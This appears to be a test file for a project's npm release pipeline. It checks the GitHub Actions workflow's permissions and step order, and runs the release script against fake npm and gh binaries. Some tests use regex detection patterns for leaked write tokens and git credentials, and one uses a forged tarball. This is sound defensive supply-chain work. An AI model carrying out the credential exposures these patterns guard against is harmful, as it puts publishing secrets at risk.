// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Usertools, Inc.

/**
 * THE RELEASE WORKFLOW PUBLISHES ONLY WHAT CI PASSED, ONLY AFTER AN APPROVAL, AND KEEPS ITS
 * WRITE CREDENTIALS AWAY FROM DEPENDENCY CODE. A DRY RUN CHANGES NOTHING.
 *
 * .github/workflows/publish.yml is read as YAML (not matched as prose) and scripts/release.sh,
 * which holds its shell logic, is run against a fake `npm` and `gh` in a throwaway git
 * repository. Nothing here talks to a registry or to GitHub.
 *
 * Pinned:
 * - REQUIRED_CI_JOBS names exactly the jobs ci.yml runs on a push to master, so adding,
 *   renaming or removing a CI job fails here until the release's list follows.
 * - Jobs: ci-gate, then build (read-only token, no OIDC: everything that runs dependency
 *   code), then publish (the `npm-publish` environment; write token, OIDC, NPM_TOKEN). No job
 *   that can write or mint an OIDC token installs, builds, tests or lints.
 * - No checkout persists a credential; the write token reaches git only in the push step.
 * - ci-gate refuses unless the environment requires a reviewer; a 404, a 403 and an
 *   unreadable answer all refuse.
 * - Order: commit and tag locally, pack, publish dry run, push, publish, GitHub Release.
 *   Nothing is published before the commit and tag are pushed.
 * - A dry run never pushes, publishes or creates a release.
 * - The CI gate fails closed and names the check: missing, pending, skipped and failed CI
 *   jobs, no CI run at all, and an unreadable registry all stop the release.
 * - Publishing checks every tarball's name and version before publishing any.
 * - Republish gates on the release commit's parent only when the release commit changes
 *   nothing but the lockstep package.json "version" fields.
 */

import { spawnSync } from "node:child_process";
import {
	chmodSync,
	existsSync,
	mkdirSync,
	mkdtempSync,
	readFileSync,
	rmSync,
	symlinkSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { parse } from "yaml";

const ROOT = resolve(import.meta.dirname, "../../../..");
const PUBLISH = join(ROOT, ".github/workflows/publish.yml");
const CI = join(ROOT, ".github/workflows/ci.yml");
const SCRIPT = join(ROOT, "scripts/release.sh");

interface Step {
	name?: string;
	uses?: string;
	with?: Record<string, unknown>;
	if?: string;
	run?: string;
	env?: Record<string, unknown>;
}
interface Job {
	name?: string;
	needs?: string | string[];
	environment?: string | { name: string };
	permissions?: Record<string, string>;
	steps?: Step[];
}
interface Workflow {
	env?: Record<string, string>;
	permissions?: Record<string, string>;
	jobs: Record<string, Job>;
}

const publish = parse(readFileSync(PUBLISH, "utf8")) as Workflow;
const ci = parse(readFileSync(CI, "utf8")) as Workflow;

/** A ci.yml job's name on a push to master. An expression name must yield its key there. */
function pushName(key: string, job: Job): string {
	const name = job.name ?? key;
	if (!name.includes("${{")) return name;
	if (!name.includes(`&& '${key}' ||`)) {
		throw new Error(`ci.yml job ${key}: cannot tell its push-event name from "${name}"`);
	}
	return key;
}

const requiredJobs = (publish.env?.REQUIRED_CI_JOBS ?? "").split(/\s+/).filter(Boolean);
const jobSteps = (job: string): Step[] => {
	const steps = publish.jobs[job]?.steps;
	if (!Array.isArray(steps)) throw new Error(`publish.yml has no job "${job}"`);
	return steps;
};
const allSteps = (): [string, Step][] =>
	Object.keys(publish.jobs).flatMap((j) => jobSteps(j).map((s): [string, Step] => [j, s]));
const stepIndex = (job: string, name: string): number => {
	const i = jobSteps(job).findIndex((s) => s.name === name);
	if (i < 0) throw new Error(`job ${job} has no step named "${name}"`);
	return i;
};
const step = (job: string, name: string): Step => jobSteps(job)[stepIndex(job, name)] as Step;
const envName = (job: Job): string | undefined =>
	typeof job.environment === "string" ? job.environment : job.environment?.name;
/** Holds a credential that can write to the repository or mint an OIDC token. */
const privileged = (job: Job): boolean =>
	job.permissions?.contents === "write" || job.permissions?.["id-token"] === "write";
/** Runs code from the repository's dependencies (or the package manager on their behalf). */
const DEPENDENCY_CODE =
	/\bnpm\s+(ci|install|i|run|test|exec|version|rebuild)\b|\bnpx\b|\bvitest\b|\btsc\b|\bbiome\b|\bvite\b|\btsx\b/;
const WRITE_TOKEN = /github\.token|secrets\.GITHUB_TOKEN/;

describe("publish.yml", () => {
	it("REQUIRED_CI_JOBS names exactly the jobs ci.yml runs on a push", () => {
		const ciNames = Object.entries(ci.jobs).map(([k, j]) => pushName(k, j));
		expect([...requiredJobs].sort()).toEqual([...ciNames].sort());
		expect(requiredJobs.length).toBeGreaterThanOrEqual(7);
	});

	it("runs ci-gate, then build, then publish under the npm-publish environment", () => {
		expect(Object.keys(publish.jobs).sort()).toEqual(["build", "ci-gate", "publish"]);
		expect([publish.jobs.build?.needs ?? []].flat()).toEqual(["ci-gate"]);
		expect([publish.jobs.publish?.needs ?? []].flat()).toEqual(["build"]);
		expect(envName(publish.jobs.publish as Job)).toBe("npm-publish");
		expect(envName(publish.jobs.build as Job)).toBeUndefined();
	});

	it("grants nothing by default, and write and OIDC only to the publish job", () => {
		expect(publish.permissions).toEqual({});
		expect(publish.jobs["ci-gate"]?.permissions).toEqual({ contents: "read", actions: "read" });
		expect(publish.jobs.build?.permissions).toEqual({ contents: "read" });
		expect(publish.jobs.publish?.permissions).toEqual({
			contents: "write",
			"id-token": "write",
			actions: "read",
		});
		const holders = Object.entries(publish.jobs)
			.filter(([, j]) => privileged(j))
			.map(([k]) => k);
		expect(holders).toEqual(["publish"]);
	});

	it("no job that can write or mint an OIDC token runs dependency code", () => {
		for (const [name, job] of Object.entries(publish.jobs)) {
			if (!privileged(job)) continue;
			for (const s of job.steps ?? []) {
				expect(s.run ?? "", `${name}: ${s.name}`).not.toMatch(DEPENDENCY_CODE);
				if (s.uses) {
					expect(s.uses).toMatch(/^actions\/(checkout|setup-node|download-artifact)@/);
					expect(s.with?.cache, `${name}: ${s.uses} restores no cache`).toBeUndefined();
				}
			}
		}
		// The control: the build job does run it, so the pattern can see it.
		expect(jobSteps("build").some((s) => DEPENDENCY_CODE.test(s.run ?? ""))).toBe(true);
	});

	it("no checkout persists a credential", () => {
		const checkouts = allSteps().filter(([, s]) => s.uses?.startsWith("actions/checkout@"));
		expect(checkouts.length).toBe(3);
		for (const [job, s] of checkouts) {
			expect(s.with?.["persist-credentials"], `${job}: checkout`).toBe(false);
		}
	});

	it("in a privileged job, the write token reaches only the gate, the push and the release", () => {
		const withToken = jobSteps("publish").filter((s) => WRITE_TOKEN.test(JSON.stringify(s)));
		expect(withToken.map((s) => s.name)).toEqual([
			"Require CI success on the commit being released",
			"Push the release commit and tag",
			"Create GitHub Release",
		]);
		// Only the push hands it to git, through the environment of one process, never a file.
		const handsToGit = allSteps().filter(([, s]) => /extraheader|GIT_CONFIG_/.test(s.run ?? ""));
		expect(handsToGit.map(([, s]) => s.name)).toEqual(["Push the release commit and tag"]);
		const push = step("publish", "Push the release commit and tag");
		expect(push.run).toContain("GIT_CONFIG_VALUE_0=");
		expect(push.run).not.toMatch(/git\s+config|git\s+remote|>>|\btee\b|GITHUB_ENV/);
		// And no step anywhere writes git credentials to a file.
		for (const [job, s] of allSteps()) {
			expect(s.run ?? "", `${job}: ${s.name}`).not.toMatch(
				/git\s+config[^\n]*(extraheader|credential|url\.)|git\s+remote\s+set-url/,
			);
		}
	});

	it("ci-gate requires an approval on the environment the publish job uses", () => {
		const gate = jobSteps("ci-gate").filter((s) =>
			/release\.sh assert-protected\b/.test(s.run ?? ""),
		);
		expect(gate.length).toBe(1);
		expect(gate[0]?.run).toMatch(
			new RegExp(`release\\.sh assert-protected ${envName(publish.jobs.publish as Job)}\\s*$`),
		);
		expect(gate[0]?.if).toBeUndefined();
	});

	it("the CI gate runs in ci-gate and again in publish, before the artifacts are used", () => {
		expect(jobSteps("ci-gate").some((s) => /release\.sh gate\b/.test(s.run ?? ""))).toBe(true);
		const gate = jobSteps("publish").findIndex((s) => /release\.sh gate\b/.test(s.run ?? ""));
		const download = jobSteps("publish").findIndex((s) =>
			s.uses?.startsWith("actions/download-artifact@"),
		);
		expect(gate).toBeGreaterThanOrEqual(0);
		expect(gate).toBeLessThan(download);
	});

	it("build commits, tags and packs, in that order, and hands the result on", () => {
		const order = [
			stepIndex("build", "Commit and tag (local)"),
			stepIndex("build", "The tree to publish is the tree committed"),
			stepIndex("build", "Pack the packages and the release commit"),
			jobSteps("build").findIndex((s) => s.uses?.startsWith("actions/upload-artifact@")),
		];
		expect(order).toEqual([...order].sort((a, b) => a - b));
		expect(order[3]).toBeGreaterThan(0);
	});

	it("publish verifies, dry-runs, pushes, publishes, then releases, in that order", () => {
		const order = [
			jobSteps("publish").findIndex((s) => s.uses?.startsWith("actions/download-artifact@")),
			stepIndex("publish", "Select and verify what to publish"),
			stepIndex("publish", "Publish packages (dry run)"),
			stepIndex("publish", "Push the release commit and tag"),
			stepIndex("publish", "Publish packages"),
			stepIndex("publish", "Create GitHub Release"),
		];
		expect(order[0]).toBeGreaterThan(0);
		expect(order).toEqual([...order].sort((a, b) => a - b));
	});

	it("a dry run never pushes, publishes or creates a release", () => {
		const effects =
			/\bgit push\b|\bgh release create\b|\bnpm publish\b(?![^\n]*--dry-run)|release\.sh publish\b(?![^\n]*--dry-run)/;
		const effectful = allSteps().filter(([, s]) => effects.test(s.run ?? ""));
		expect(effectful.map(([j, s]) => `${j}: ${s.name}`)).toEqual([
			"publish: Push the release commit and tag",
			"publish: Publish packages",
			"publish: Create GitHub Release",
		]);
		for (const [, s] of effectful) expect(s.if ?? "").toContain("!inputs.dry_run");
	});

	it("a republish never bumps, commits, tags or pushes", () => {
		for (const [job, name] of [
			["build", "Refuse to bump past a version that is not fully published"],
			["build", "Refuse a version that is already released"],
			["build", "Format package.json after bump"],
			["build", "Commit and tag (local)"],
			["publish", "Push the release commit and tag"],
		] as const) {
			expect(step(job, name).if ?? "", `${job}: ${name}`).toContain("!inputs.republish");
		}
	});

	it("a normal release publishes only after its push succeeded", () => {
		const push = step("publish", "Push the release commit and tag");
		const pub = step("publish", "Publish packages");
		const rel = step("publish", "Create GitHub Release");
		expect(stepIndex("publish", push.name as string)).toBeLessThan(
			stepIndex("publish", pub.name as string),
		);
		// A failed step skips every later step unless one asks to run anyway; none may.
		for (const s of jobSteps("publish")) {
			expect(s, `publish: ${s.name}`).not.toHaveProperty("continue-on-error");
			expect(s.if ?? "", `publish: ${s.name}`).not.toMatch(/always\(|failure\(|cancelled\(/);
		}
		expect(publish.jobs.publish).not.toHaveProperty("continue-on-error");
		// And the push itself cannot swallow its own failure.
		expect(push.run).not.toMatch(/\|\||set \+e|\btrue\b/);
		expect(rel.if).toBe(pub.if);
	});

	it("every GitHub Release states Latest explicitly, from the semver comparison", () => {
		const rel = step("publish", "Create GitHub Release").run ?? "";
		expect(rel).toMatch(/latest=\$\(bash scripts\/release\.sh latest-flag "\$VERSION"\)/);
		const creates = rel.split("\n").filter((l) => /gh release create/.test(l));
		expect(creates.length).toBe(1);
		expect(rel).toMatch(/"--latest=\$\{latest\}"/);
		expect(rel).not.toMatch(/--latest(?!=\$\{latest\})/);
	});

	it("the publish job never executes, checks out or configures from the build's output", () => {
		for (const s of jobSteps("publish")) {
			expect(s.run ?? "", `publish: ${s.name}`).not.toMatch(
				/\bnode\b|\bnpx?\b|require\(|import\(|git\s+(checkout|switch|reset|restore|worktree|stash)\b|(^|[;&|]\s*)(source|\.)\s/m,
			);
			if (s.uses?.startsWith("actions/setup-node@")) {
				expect(s.with?.["registry-url"], "setup-node writes no npm config").toBeUndefined();
			}
		}
		// The build's reported version is read in exactly one place, which validates it.
		const fromBuild = jobSteps("publish").filter((s) => JSON.stringify(s).includes("needs.build"));
		expect(fromBuild.map((s) => s.name)).toEqual(["Select and verify what to publish"]);
		for (const name of [
			"Push the release commit and tag",
			"Publish packages",
			"Create GitHub Release",
		]) {
			expect(JSON.stringify(step("publish", name).env), name).toContain("steps.source.outputs");
		}
		expect(step("publish", "Push the release commit and tag").run).toMatch(
			/"\$\{COMMIT\}:refs\/heads\/master"/,
		);
	});

	it("only the publish step sees the npm token", () => {
		const withToken = allSteps().filter(([, s]) => JSON.stringify(s).includes("NPM_TOKEN"));
		expect(withToken.map(([j, s]) => `${j}: ${s.name}`)).toEqual(["publish: Publish packages"]);
	});
});

// ── scripts/release.sh against a fake npm, gh and git history ──

const DIRS = ["core", "verify", "openclaw", "server", "acs-adapter", "ui"];
const NAMES: Record<string, string> = {
	core: "usertrust",
	verify: "usertrust-verify",
	openclaw: "usertrust-openclaw",
	server: "usertrust-server",
	"acs-adapter": "usertrust-acs-adapter",
	ui: "usertrust-ui",
};

const FAKE_NPM = `#!/usr/bin/env bash
# view <spec> version: answers from $FAKE_REGISTRY ("<spec> yes|no|error" lines; unlisted = no).
# pack ...: writes a real tarball of ./package.json to --pack-destination; logs "pack|<dir>|<args>".
# publish <tgz> ...: records what it was given, and where, in $FAKE_LOG.
case "$1" in
pack)
	echo "pack|$(basename "$PWD")|$*" >> "$FAKE_LOG"
	dest=""
	while [ $# -gt 0 ]; do
		[ "$1" = --pack-destination ] && dest="$2"
		shift
	done
	name=$(node -p 'require("./package.json").name')
	ver=$(node -p 'require("./package.json").version')
	tmp=$(mktemp -d)
	mkdir "$tmp/package"
	cp package.json "$tmp/package/"
	tar -czf "$dest/$name-$ver.tgz" -C "$tmp" package
	;;
view)
	state=$(awk -v s="$2" '$1 == s { print $2 }' "$FAKE_REGISTRY")
	case "$state" in
	yes) echo "\${2##*@}" ;;
	error) echo "npm error code ETIMEDOUT" >&2; exit 1 ;;
	*) echo "npm error code E404" >&2; exit 1 ;;
	esac
	;;
publish)
	# Logs: tarball | flags | entries in the cwd | user config text | global config bytes.
	shift
	tgz="$1"
	shift
	flags=""
	cfg=/dev/null
	gcfg=/dev/null
	while [ $# -gt 0 ]; do
		case "$1" in
		--userconfig) cfg="$2"; shift ;;
		--globalconfig) gcfg="$2"; shift ;;
		*) flags="$flags $1" ;;
		esac
		shift
	done
	cwd=$(ls -A | wc -l | tr -d ' ')
	echo "publish|$(basename "$tgz")|\${flags# }|cwd=\${cwd}|userconfig=$(tr '\n' ';' < "$cfg")|globalconfig=$(wc -c < "$gcfg" | tr -d ' ')" >> "$FAKE_LOG"
	;;
*) echo "fake npm: unexpected $*" >&2; exit 99 ;;
esac
`;

const FAKE_GH = `#!/usr/bin/env bash
# api <path>: records the path in $FAKE_LOG; answers runs from $FAKE_RUNS, jobs from $FAKE_JOBS,
# an environment from $FAKE_ENV, or fails with HTTP $FAKE_ENV_HTTP when that is set.
[ "$1" = api ] || { echo "fake gh: unexpected $*" >&2; exit 99; }
echo "gh|$2" >> "$FAKE_LOG"
case "$2" in
*/actions/workflows/ci.yml/runs*) cat "$FAKE_RUNS" ;;
*/actions/runs/*/jobs*) cat "$FAKE_JOBS" ;;
*/environments/*)
	if [ -n "\${FAKE_ENV_HTTP:-}" ]; then
		echo '{"message":"error"}'
		echo "gh: error (HTTP \${FAKE_ENV_HTTP})" >&2
		exit 1
	fi
	cat "$FAKE_ENV"
	;;
*) echo "fake gh: unexpected path $2" >&2; exit 99 ;;
esac
`;

let dir: string;
let repo: string;

function git(...args: string[]): string {
	const r = spawnSync("git", args, { cwd: repo, encoding: "utf8", env: gitEnv() });
	if (r.status !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr}`);
	return r.stdout.trim();
}

function gitIn(cwd: string, ...args: string[]): string {
	const r = spawnSync("git", args, { cwd, encoding: "utf8", env: gitEnv() });
	if (r.status !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr}`);
	return r.stdout.trim();
}

function gitEnv(): NodeJS.ProcessEnv {
	return {
		...process.env,
		GIT_CONFIG_GLOBAL: "/dev/null",
		GIT_CONFIG_NOSYSTEM: "1",
		GIT_AUTHOR_NAME: "t",
		GIT_AUTHOR_EMAIL: "t@example.com",
		GIT_COMMITTER_NAME: "t",
		GIT_COMMITTER_EMAIL: "t@example.com",
	};
}

function writePackages(version: string, extra: Record<string, unknown> = {}): void {
	for (const d of DIRS) {
		mkdirSync(join(repo, "packages", d), { recursive: true });
		const pkg = { name: NAMES[d], version, license: "Apache-2.0", ...extra };
		writeFileSync(
			join(repo, "packages", d, "package.json"),
			`${JSON.stringify(pkg, null, "\t")}\n`,
		);
	}
}

function setRegistry(lines: string[]): void {
	writeFileSync(join(dir, "registry"), `${lines.join("\n")}\n`);
}

const job = (name: string, conclusion: string | null, status = "completed") => ({
	name,
	status,
	conclusion,
});

function setCi(
	jobs: ReturnType<typeof job>[] | null,
	run: { status?: string; conclusion?: string | null } = {},
): void {
	const runs =
		jobs === null
			? []
			: [
					{
						id: 42,
						html_url: "https://example.invalid/runs/42",
						created_at: "2026-01-01T00:00:00Z",
						status: run.status ?? "completed",
						conclusion: run.conclusion === undefined ? "success" : run.conclusion,
					},
				];
	writeFileSync(
		join(dir, "runs.json"),
		JSON.stringify({ total_count: runs.length, workflow_runs: runs }),
	);
	writeFileSync(join(dir, "jobs.json"), JSON.stringify({ jobs: jobs ?? [] }));
}

const allGreen = () => requiredJobs.map((n) => job(n, "success"));

const reviewersRule = (n: number, preventSelfReview = true) => ({
	id: 2,
	type: "required_reviewers",
	prevent_self_review: preventSelfReview,
	reviewers: Array.from({ length: n }, (_, i) => ({
		type: "User",
		reviewer: { login: `r${i}`, id: i },
	})),
});

function setEnvironment(body: unknown): void {
	writeFileSync(join(dir, "env.json"), typeof body === "string" ? body : JSON.stringify(body));
}

const protectedEnv = (
	rules: unknown[] = [reviewersRule(1)],
	policy: unknown = { protected_branches: false, custom_branch_policies: true },
) => ({
	id: 1,
	name: "npm-publish",
	protection_rules: rules,
	deployment_branch_policy: policy,
});

/** The tarballs `release.sh pack` writes, through the fake npm, into <dir>/tarballs. */
function packAll(): string {
	const out = join(dir, "tarballs");
	const r = run(["pack", out]);
	if (r.status !== 0) throw new Error(`pack failed: ${r.err}`);
	rmSync(join(dir, "log"), { force: true });
	return out;
}

const published = (version: string, dirs: string[], dry: boolean) =>
	dirs.map(
		(d) =>
			`publish|${NAMES[d]}-${version}.tgz|--access public --provenance --registry https://registry.npmjs.org/${dry ? " --dry-run" : ""}|cwd=0|userconfig=${dry ? "" : `//registry.npmjs.org/:_authToken=$${"{"}NODE_AUTH_TOKEN};`}|globalconfig=0`,
	);

function run(args: string[], env: Record<string, string> = {}) {
	const r = spawnSync("bash", [join(repo, "scripts/release.sh"), ...args], {
		cwd: repo,
		encoding: "utf8",
		timeout: 20_000,
		env: {
			...gitEnv(),
			PATH: `${join(dir, "bin")}:${process.env.PATH}`,
			FAKE_REGISTRY: join(dir, "registry"),
			FAKE_RUNS: join(dir, "runs.json"),
			FAKE_JOBS: join(dir, "jobs.json"),
			FAKE_LOG: join(dir, "log"),
			FAKE_ENV: join(dir, "env.json"),
			GITHUB_REPOSITORY: "owner/repo",
			REQUIRED_CI_JOBS: publish.env?.REQUIRED_CI_JOBS ?? "",
			REPUBLISH: "false",
			...env,
		},
	});
	return { status: r.status, out: r.stdout, err: r.stderr };
}

function log(): string[] {
	try {
		return readFileSync(join(dir, "log"), "utf8").trim().split("\n").filter(Boolean);
	} catch {
		return [];
	}
}

/** A release commit the way the workflow makes one: only the six versions change. */
function releaseCommit(version: string): void {
	writePackages(version);
	git("add", ...DIRS.map((d) => `packages/${d}/package.json`));
	git("commit", "-q", "-m", `release: v${version}`);
	git("tag", "-a", `v${version}`, "-m", `v${version}`);
}

beforeEach(() => {
	dir = mkdtempSync(join(tmpdir(), "release-sh-"));
	repo = join(dir, "repo");
	mkdirSync(join(dir, "bin"), { recursive: true });
	for (const [name, body] of [
		["npm", FAKE_NPM],
		["gh", FAKE_GH],
	] as const) {
		writeFileSync(join(dir, "bin", name), body);
		chmodSync(join(dir, "bin", name), 0o755);
	}
	mkdirSync(join(repo, "scripts"), { recursive: true });
	writeFileSync(join(repo, "scripts/release.sh"), readFileSync(SCRIPT, "utf8"));
	writePackages("1.0.0");
	writeFileSync(join(repo, "README"), "x\n");
	git("init", "-q", "-b", "master");
	git("add", ".");
	git("commit", "-q", "-m", "base");
	// The remote the script fetches master and tags from.
	gitIn(dir, "init", "-q", "--bare", "-b", "master", "origin.git");
	git("remote", "add", "origin", join(dir, "origin.git"));
	git("push", "-q", "origin", "master");
	setRegistry([]);
	setCi(allGreen());
	setEnvironment(protectedEnv());
});

afterEach(() => {
	rmSync(dir, { recursive: true, force: true });
});

describe("release.sh pack", { timeout: 30_000 }, () => {
	it("packs every package, running no lifecycle script", () => {
		const out = join(dir, "tarballs");
		const r = run(["pack", out]);
		expect(r.status).toBe(0);
		expect(log()).toEqual(
			DIRS.map((d) => `pack|${d}|pack --ignore-scripts --pack-destination ${out}`),
		);
		for (const d of DIRS) expect(r.out).toContain(`packed ${NAMES[d]}-1.0.0.tgz`);
	});
});

describe("release.sh publish", { timeout: 30_000 }, () => {
	it("dry run: the real publish command plus --dry-run, for every tarball, in order", () => {
		const out = packAll();
		const r = run(["publish", out, "HEAD", "--dry-run"]);
		expect(r.status).toBe(0);
		expect(log()).toEqual(published("1.0.0", DIRS, true));
	});

	it("real run: the same command without --dry-run", () => {
		const out = packAll();
		const r = run(["publish", out, "HEAD"]);
		expect(r.status).toBe(0);
		expect(log()).toEqual(published("1.0.0", DIRS, false));
	});

	it("skips a version already on npm (finishing a partial publish)", () => {
		const out = packAll();
		setRegistry(["usertrust@1.0.0 yes", "usertrust-verify@1.0.0 yes"]);
		const r = run(["publish", out, "HEAD"]);
		expect(r.status).toBe(0);
		expect(log()).toEqual(published("1.0.0", DIRS.slice(2), false));
	});

	it("an unreadable registry stops it before that package, never reads as 'not published'", () => {
		const out = packAll();
		setRegistry(["usertrust-openclaw@1.0.0 error"]);
		const r = run(["publish", out, "HEAD"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("usertrust-openclaw@1.0.0");
		expect(log()).toEqual(published("1.0.0", DIRS.slice(0, 2), false));
	});

	it("publishes nothing if any tarball is missing", () => {
		const out = packAll();
		rmSync(join(out, "usertrust-ui-1.0.0.tgz"));
		const r = run(["publish", out, "HEAD"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("usertrust-ui-1.0.0.tgz is missing");
		expect(log()).toEqual([]);
	});

	it("publishes nothing if a tarball holds another version than its name says", () => {
		const out = packAll();
		const tmp = join(dir, "forged");
		mkdirSync(join(tmp, "package"), { recursive: true });
		writeFileSync(
			join(tmp, "package/package.json"),
			JSON.stringify({ name: "usertrust-server", version: "1.0.9" }),
		);
		const t = spawnSync("tar", [
			"-czf",
			join(out, "usertrust-server-1.0.0.tgz"),
			"-C",
			tmp,
			"package",
		]);
		expect(t.status).toBe(0);
		const r = run(["publish", out, "HEAD"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain('version is "1.0.9", not 1.0.0');
		expect(log()).toEqual([]);
	});

	it("refuses packages that disagree on the version", () => {
		const out = packAll();
		writeFileSync(
			join(repo, "packages/ui/package.json"),
			JSON.stringify({ name: "usertrust-ui", version: "1.0.1" }),
		);
		git("commit", "-q", "-am", "ui drifts");
		const r = run(["publish", out, "HEAD", "--dry-run"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("packages/ui is at 1.0.1");
		expect(log()).toEqual([]);
	});

	it("rejects an unknown flag, and a missing directory", () => {
		const out = packAll();
		expect(run(["publish", out, "HEAD", "--force"]).status).not.toBe(0);
		expect(run(["publish", out]).status).not.toBe(0);
		expect(run(["publish", "--dry-run"]).status).not.toBe(0);
		expect(run(["publish"]).status).not.toBe(0);
		expect(log()).toEqual([]);
	});
});

describe("release.sh assert-protected", { timeout: 30_000 }, () => {
	it("passes when the environment requires one reviewer, and asks about that environment", () => {
		const r = run(["assert-protected", "npm-publish"]);
		expect(r.status).toBe(0);
		expect(r.out).toContain("requires 1 reviewer(s)");
		expect(log()).toEqual(["gh|repos/owner/repo/environments/npm-publish"]);
	});

	it("passes with a warning when there is no deployment-branch policy", () => {
		setEnvironment(protectedEnv([reviewersRule(2)], null));
		const r = run(["assert-protected", "npm-publish"]);
		expect(r.status).toBe(0);
		expect(r.out).toContain("no deployment-branch policy");
	});

	const refusals: [string, () => void, string][] = [
		["a 404 (no such environment)", () => {}, "does not exist"],
		["a 403 (permission)", () => {}, "actions: read"],
		["another HTTP error", () => {}, "Could not read environment"],
		["no protection rules", () => setEnvironment(protectedEnv([])), "requires no reviewer"],
		[
			"a required_reviewers rule with 0 reviewers",
			() => setEnvironment(protectedEnv([reviewersRule(0)])),
			"requires no reviewer",
		],
		[
			"only a wait timer",
			() => setEnvironment(protectedEnv([{ id: 3, type: "wait_timer", wait_timer: 30 }])),
			"requires no reviewer",
		],
		[
			"protection_rules missing",
			() => setEnvironment({ id: 1, name: "npm-publish" }),
			"requires no reviewer",
		],
		["an unparseable answer", () => setEnvironment("<html>oops</html>"), "not an environment"],
		["an empty answer", () => setEnvironment(""), "not an environment"],
		[
			"another environment's answer",
			() => setEnvironment({ ...protectedEnv(), name: "staging" }),
			"not an environment",
		],
	];
	const http: Record<string, string> = {
		"a 404 (no such environment)": "404",
		"a 403 (permission)": "403",
		"another HTTP error": "502",
	};
	for (const [what, arrange, message] of refusals) {
		it(`refuses on ${what}`, () => {
			arrange();
			const r = run(
				["assert-protected", "npm-publish"],
				http[what] ? { FAKE_ENV_HTTP: http[what] } : {},
			);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain(message);
			expect(r.err).toContain("Refusing to release");
		});
	}

	it("the 404 refusal names the owner step", () => {
		const r = run(["assert-protected", "npm-publish"], { FAKE_ENV_HTTP: "404" });
		expect(r.err).toContain("Owner step: create 'npm-publish'");
	});

	it("refuses without an environment name", () => {
		expect(run(["assert-protected"]).status).not.toBe(0);
		expect(log()).toEqual([]);
	});
});

describe("release.sh assert-unreleased / assert-published", { timeout: 30_000 }, () => {
	it("a new version with no tag and nothing on npm passes", () => {
		expect(run(["assert-unreleased"]).status).toBe(0);
	});

	it("an existing tag fails", () => {
		git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
		const r = run(["assert-unreleased"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("Tag v1.0.0 already exists");
	});

	it("a version already on npm fails and is named", () => {
		setRegistry(["usertrust-server@1.0.0 yes"]);
		const r = run(["assert-unreleased"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("usertrust-server@1.0.0 is already on npm");
	});

	it("assert-published names what is missing and points at republish", () => {
		setRegistry(DIRS.filter((d) => d !== "ui").map((d) => `${NAMES[d]}@1.0.0 yes`));
		const r = run(["assert-published"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("usertrust-ui@1.0.0");
		expect(r.err).toContain("republish on the tag v1.0.0");
	});

	it("assert-published passes when all six are on npm", () => {
		setRegistry(DIRS.map((d) => `${NAMES[d]}@1.0.0 yes`));
		expect(run(["assert-published"]).status).toBe(0);
	});
});

describe("release.sh gate (normal release)", { timeout: 30_000 }, () => {
	it("passes when every required job succeeded, and asks about this exact commit", () => {
		const r = run(["gate"]);
		expect(r.status).toBe(0);
		const head = git("rev-parse", "HEAD");
		expect(log()[0]).toBe(
			`gh|repos/owner/repo/actions/workflows/ci.yml/runs?head_sha=${head}&event=push&per_page=100`,
		);
	});

	const cases: [string, ReturnType<typeof job>[], string][] = [
		["missing", allGreen().filter((j) => j.name !== "lint"), "'lint' on"],
		[
			"pending",
			allGreen().map((j) => (j.name === "test" ? job("test", null, "in_progress") : j)),
			"'test' on",
		],
		[
			"skipped",
			allGreen().map((j) => (j.name === "site-build" ? job("site-build", "skipped") : j)),
			"'site-build' on",
		],
		[
			"failed",
			allGreen().map((j) => (j.name === "typecheck" ? job("typecheck", "failure") : j)),
			"'typecheck' on",
		],
		[
			"cancelled",
			allGreen().map((j) => (j.name === "tb-integration" ? job("tb-integration", "cancelled") : j)),
			"'tb-integration' on",
		],
	];
	for (const [what, jobs, named] of cases) {
		it(`fails on a ${what} required check, and names it`, () => {
			setCi(jobs);
			const r = run(["gate"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain(named);
		});
	}

	it("fails when CI never ran on the commit", () => {
		setCi(null);
		const r = run(["gate"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("has no run for a push of");
	});

	it("fails while the CI run is still in progress", () => {
		setCi(allGreen(), { status: "in_progress", conclusion: null });
		const r = run(["gate"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("is in_progress");
	});

	it("fails on a failed job the list does not name", () => {
		setCi([...allGreen(), job("new-job", "failure")]);
		const r = run(["gate"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("'new-job'");
	});

	it("fails when the workflow pins no checks", () => {
		const r = run(["gate"], { REQUIRED_CI_JOBS: "  " });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("REQUIRED_CI_JOBS is empty");
	});
});

describe("release.sh gate (republish)", { timeout: 30_000 }, () => {
	it("release-parent prints the parent of a version-only release commit", () => {
		const parent = git("rev-parse", "HEAD");
		releaseCommit("1.0.1");
		const r = run(["release-parent"]);
		expect(r.status).toBe(0);
		expect(r.out.trim()).toBe(parent);
	});

	it("gates on the parent of a version-only release commit that is on master", () => {
		const parent = git("rev-parse", "HEAD");
		releaseCommit("1.0.1");
		git("push", "-q", "origin", "master");
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).toBe(0);
		expect(r.out).toContain("is on master");
		expect(log()[0]).toContain(`head_sha=${parent}&`);
	});

	it("refuses a version-only release commit tagged on a side branch, never on master", () => {
		git("switch", "-q", "-c", "side");
		releaseCommit("1.0.1");
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("is not on master");
		expect(r.err).toContain("side branch");
		expect(log()).toEqual([]);
	});

	it("checks master as it is now, not a stale local origin/master", () => {
		releaseCommit("1.0.1");
		git("push", "-q", "origin", "master");
		// The remote's master is rewound past the release; the local ref still has it.
		const base = git("rev-parse", "HEAD^");
